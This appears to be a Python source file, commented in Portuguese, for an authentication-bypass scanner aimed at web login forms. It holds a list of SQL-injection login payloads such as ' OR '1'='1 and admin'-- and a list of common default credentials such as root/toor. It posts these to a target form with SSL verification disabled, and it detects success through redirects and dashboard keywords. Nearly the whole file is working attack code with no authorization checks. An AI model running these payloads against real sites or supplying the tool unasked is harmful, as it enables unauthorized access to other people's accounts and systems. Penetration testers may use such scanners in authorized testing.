"""
Scanner de Bypass de Autenticação — Vlad Volkov
Testa técnicas de bypass de autenticação em formulários de login.
"""

import re
import time
from typing import List, Optional

from rich.console import Console
from rich.table import Table
from rich import box

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    pass

console = Console()

# Payloads de bypass SQL em formulários de login
PAYLOADS_BYPASS_SQL = [
    ("' OR '1'='1", "' OR '1'='1"),
    ("admin'--", "qualquer"),
    ("' OR 1=1--", "qualquer"),
    ("admin' #", "qualquer"),
    ("' OR 'x'='x", "' OR 'x'='x"),
    ("admin'/*", "qualquer"),
    ("' OR 1=1#", "qualquer"),
    ("\" OR \"1\"=\"1", "\" OR \"1\"=\"1"),
    ("admin\" --", "qualquer"),
]

# Credenciais padrão comuns
CREDENCIAIS_PADRAO = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("root", "root"),
    ("root", "toor"),
    ("administrator", "administrator"),
    ("admin", ""),
    ("", ""),
    ("guest", "guest"),
]

# Indicadores de login bem-sucedido
INDICADORES_SUCESSO = [
    r"dashboard", r"painel", r"logout", r"sign.?out",
    r"welcome", r"bem.?vindo", r"profile", r"perfil",
    r"admin panel", r"administration",
]

# Indicadores de login falho
INDICADORES_FALHA = [
    r"invalid", r"inválido", r"incorrect", r"incorreto",
    r"wrong", r"errado", r"failed", r"falhou",
    r"denied", r"negado", r"unauthorized",
]


class ScannerBypassAuth:
    """Testa bypass de autenticação em formulários de login."""

    def __init__(self, timeout: int = 10, verificar_ssl: bool = False):
        self.timeout = timeout
        self.verificar_ssl = verificar_ssl
        self.sessao = requests.Session()
        self.sessao.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.vulnerabilidades = []

    def _requisicao_post(self, url: str, dados: dict) -> Optional[object]:
        try:
            return self.sessao.post(url, data=dados, timeout=self.timeout,
                                    verify=self.verificar_ssl, allow_redirects=True)
        except Exception:
            return None

    def _detectar_sucesso(self, resposta, url_original: str) -> bool:
        if resposta is None:
            return False

        # Verificar mudança de URL (redirect após login)
        if resposta.url != url_original and "login" not in resposta.url.lower():
            corpo = resposta.text.lower()
            for ind in INDICADORES_SUCESSO:
                if re.search(ind, corpo, re.IGNORECASE):
                    return True

        return False

    def testar_bypass_sql(self, url: str, campo_usuario: str = "username",
                          campo_senha: str = "password", verboso: bool = True) -> List[dict]:
        """Testa bypass SQL em formulário de login."""
        encontrados = []

        if verboso:
            console.print(f"  [cyan]→[/cyan] Testando Auth Bypass SQL em: {url[:60]}")

        for usuario, senha in PAYLOADS_BYPASS_SQL[:5]:
            dados = {campo_usuario: usuario, campo_senha: senha}
            resp = self._requisicao_post(url, dados)

            if self._detectar_sucesso(resp, url):
                encontrados.append({
                    "tipo": "Auth Bypass SQL",
                    "url": url,
                    "payload_usuario": usuario,
                    "payload_senha": senha,
                    "severidade": "critico",
                })
                break

            time.sleep(0.3)

        return encontrados

    def testar_credenciais_padrao(self, url: str, campo_usuario: str = "username",
                                   campo_senha: str = "password", verboso: bool = True) -> List[dict]:
        """Testa credenciais padrão."""
        encontrados = []

        if verboso:
            console.print(f"  [cyan]→[/cyan] Testando credenciais padrão em: {url[:60]}")

        for usuario, senha in CREDENCIAIS_PADRAO[:8]:
            dados = {campo_usuario: usuario, campo_senha: senha}
            resp = self._requisicao_post(url, dados)

            if self._detectar_sucesso(resp, url):
                encontrados.append({
                    "tipo": "Credencial Padrão",
                    "url": url,
                    "usuario": usuario,
                    "senha": senha,
                    "severidade": "alto",
                })
                break

            time.sleep(0.3)

        return encontrados

    def escanear(self, url: str, verboso: bool = True) -> List[dict]:
        """Executa todos os testes de auth bypass."""
        self.vulnerabilidades = []

        vulns_sql = self.testar_bypass_sql(url, verboso=verboso)
        self.vulnerabilidades.extend(vulns_sql)

        vulns_cred = self.testar_credenciais_padrao(url, verboso=verboso)
        self.vulnerabilidades.extend(vulns_cred)

        if verboso:
            if self.vulnerabilidades:
                console.print(
                    f"  [bold red]✓ Auth Bypass encontrado![/bold red] "
                    f"{len(self.vulnerabilidades)} vulnerabilidade(s)"
                )
            else:
                console.print("  [dim]✗ Nenhum bypass detectado[/dim]")

        return self.vulnerabilidades
